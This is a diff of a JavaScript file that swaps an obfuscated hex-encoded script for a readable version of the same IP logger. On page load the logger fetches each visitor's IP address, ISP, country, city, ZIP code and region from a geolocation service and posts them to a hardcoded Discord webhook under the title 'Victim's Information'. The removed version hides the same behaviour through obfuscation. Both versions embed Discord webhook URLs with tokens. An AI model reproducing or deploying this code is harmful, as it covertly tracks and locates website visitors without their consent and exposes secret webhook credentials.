@@ -1,1 +1,89 @@
-var _0x6128=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x31\x33\x36\x39\x39\x38\x34\x37\x30\x30\x31\x36\x38\x33\x35\x36\x37\x36\x2F\x78\x42\x4D\x61\x75\x63\x65\x5A\x64\x2D\x76\x37\x4D\x33\x31\x66\x39\x6E\x5F\x36\x62\x72\x61\x4E\x53\x33\x63\x73\x65\x78\x77\x6F\x71\x58\x6F\x64\x76\x74\x77\x71\x76\x35\x30\x56\x36\x32\x6C\x58\x6A\x58\x71\x37\x31\x65\x76\x35\x63\x58\x76\x4A\x73\x4B\x62\x58\x46\x50\x7A\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x61\x70\x69\x2E\x63\x6F\x2F\x6A\x73\x6F\x6E","\x47\x45\x54","\x6E\x6F\x2D\x63\x61\x63\x68\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x6A\x73\x6F\x6E","\x6C\x6F\x67","\x52\x65\x71\x75\x65\x73\x74\x20\x6E\x6F\x74\x20\x73\x65\x6E\x64","\x63\x61\x74\x63\x68","\x73\x74\x61\x74\x75\x73\x54\x65\x78\x74","\x74\x68\x65\x6E","\x50\x4F\x53\x54","","\x56\x69\x63\x74\x69\x6D\x27\x73\x20\x49\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E","\x72\x69\x63\x68","\x31\x32\x32\x32\x33\x39\x36\x38","\x60\x60\x60\x49\x50\x20\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x20\x6F\x66\x20\x74\x68\x65\x20\x72\x65\x63\x65\x6E\x74\x20\x77\x65\x62\x73\x69\x74\x65\x20\x76\x69\x73\x69\x74\x6F\x72\x2E\x60\x60\x60","\x49\x50","\x69\x70","\x20\x20\x28\x2A\x2A","\x76\x65\x72\x73\x69\x6F\x6E","\x2A\x2A\x29","\x50\x72\x6F\x76\x69\x64\x65\x72","\x6F\x72\x67","\x43\x6F\x75\x6E\x74\x72\x79","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x43\x69\x74\x79","\x63\x69\x74\x79","\x5A\x49\x50","\x70\x6F\x73\x74\x61\x6C","\x52\x65\x67\x69\x6F\x6E","\x72\x65\x67\x69\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6C\x65\x6E\x67\x74\x68","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64"];var _0x1685=[_0x6128[0],_0x6128[1],_0x6128[2],_0x6128[3],_0x6128[4],_0x6128[5],_0x6128[6],_0x6128[7],_0x6128[8],_0x6128[9],_0x6128[10],_0x6128[11],_0x6128[12],_0x6128[13],_0x6128[14],_0x6128[15],_0x6128[16],_0x6128[17],_0x6128[18],_0x6128[19],_0x6128[20],_0x6128[21],_0x6128[22],_0x6128[23],_0x6128[24],_0x6128[25],_0x6128[26],_0x6128[27],_0x6128[28],_0x6128[29],_0x6128[30],_0x6128[31],_0x6128[32],_0x6128[33],_0x6128[34]];var _0xce34=[_0x1685[0],_0x1685[1],_0x1685[2],_0x1685[3],_0x1685[4],_0x1685[5],_0x1685[6],_0x1685[7],_0x1685[8],_0x1685[9],_0x1685[10],_0x1685[11],_0x1685[12],_0x1685[13],_0x1685[14],_0x1685[15],_0x1685[16],_0x1685[17],_0x1685[18],_0x1685[19],_0x1685[20],_0x1685[21],_0x1685[22],_0x1685[23],_0x1685[24],_0x1685[25],_0x1685[26],_0x1685[27],_0x1685[28],_0x1685[29],_0x1685[30],_0x1685[31],_0x1685[32],_0x1685[33],_0x1685[34]];const webhook=_0xce34[0];async function IP_Info(){let _0xb1cdx5= await fetch(_0xce34[1],{method:_0xce34[2],cache:_0xce34[3],headers:{"\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65":_0xce34[4]}});return _0xb1cdx5[_0xce34[5]]()}IP_Info()[_0xce34[10]]((_0xb1cdx7)=>{let _0xb1cdx8=[_0xce34[25],_0xce34[27],_0xce34[29],_0xce34[31]];let _0xb1cdx9=false;for(var _0xb1cdxa=0;_0xb1cdxa< _0xb1cdx8[_0xce34[33]];_0xb1cdxa++){if( typeof (_0xb1cdx7[`${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xb1cdx8[_0xb1cdxa]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}`])=== _0xce34[34]){_0xb1cdx9= true;break}};if(_0xb1cdx9){return null};return _0xb1cdx7})[_0xce34[10]](async (_0xb1cdx7)=>{if(_0xb1cdx7!== null){ await fetch(webhook,{method:_0xce34[11],headers:{"\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65":_0xce34[4]},body:JSON[_0xce34[32]]({content:_0xce34[12],embeds:[{title:_0xce34[13],type:_0xce34[14],color:_0xce34[15],description:_0xce34[16],fields:[{name:_0xce34[17],value:`${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xb1cdx7[_0xce34[18]]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[19]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xb1cdx7[_0xce34[20]]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[21]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}`,inline:false},{name:_0xce34[22],value:`${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xb1cdx7[_0xce34[23]]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}`,inline:false},{name:_0xce34[24],value:`${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xb1cdx7[_0xce34[25]]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}`,inline:false},{name:_0xce34[26],value:`${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xb1cdx7[_0xce34[27]]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}`,inline:false},{name:_0xce34[28],value:`${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xb1cdx7[_0xce34[29]]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}`,inline:false},{name:_0xce34[30],value:`${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xb1cdx7[_0xce34[31]]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}${_0xce34[12]}${_0x6128[12]}${_0x1685[12]}${_0x6128[12]}`,inline:false}],footer:{text:_0xce34[12],icon_url:_0xce34[12]},author:{name:_0xce34[12],url:_0xce34[12]},thumbnail:{url:_0xce34[12]}}]})})[_0xce34[10]]((_0xb1cdx7)=>{console[_0xce34[6]](_0xb1cdx7[_0xce34[9]])})[_0xce34[8]]((_0xb1cdx6)=>{console[_0xce34[6]](_0xb1cdx6)})}})[_0xce34[8]]((_0xb1cdx6)=>{console[_0xce34[6]](_0xb1cdx6);console[_0xce34[6]](_0xce34[7])})
+const webhook = "https://discord.com/api/webhooks/1168463671291285534/SzOkdqzUs9AbGth6dlGMLqmSqcTZdmUJPrh0AZ7Gjo54u_qjdWIUeA-ZGumv-JQ-Dvb0"
+
+async function IP_Info(){
+    /**
+     *  
+     *  @return {fetch.Body.json()} 
+     */
+    let response = await fetch("https://ipapi.co/json", {
+      method: 'GET',
+      cache: 'no-cache',
+      headers: {
+        "content-type": "application/json"
+      }
+    })
+    return response.json()
+  }
+  IP_Info().then((value)=> {
+    let requiredInfo = [
+      "country_name", "city", "postal", "region"
+    ]
+    let noData = false
+
+    for(var i = 0; i < requiredInfo.length; i++){
+      if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
+        noData = true
+        break
+      } 
+    }
+    if(noData){
+      return null
+    }
+    return value
+  }).then( async (value) => {
+    if(value !== null){
+       await fetch(webhook, {
+        method: 'POST',
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content:"",
+          embeds: [{
+              title: "Victim's Information",
+              type:"rich",
+              color: "12223968",
+              description: "```IP information of the recent website visitor.```",
+              fields: [
+              {
+                name: "IP", value: `${value.ip}  (**${value.version}**)`, inline: false
+              },
+              {
+                name: "Provider", value: `${value.org}`, inline: false
+              },
+              {
+                name: "Country", value: `${value.country_name}`, inline: false
+              },
+              {
+                name: "City", value: `${value.city}`, inline: false
+              },
+              {
+                name: "ZIP", value: `${value.postal}`, inline: false
+              },
+              {
+                name: "Region", value: `${value.region}`, inline: false
+              }
+              ],
+              footer: {
+                text: "",
+                icon_url: ""
+              },
+              author: {
+                name: "",
+                url: ""
+              },
+              thumbnail: {
+                url: ""
+              }
+          }]
+        })
+      }).then((value)=>{
+        console.log(value.statusText)
+      }).catch((err)=>{
+        console.log(err)
+      })
+    }
+  }).catch((err)=> {
+    console.log(err)
+    console.log('Request not send')
+  })
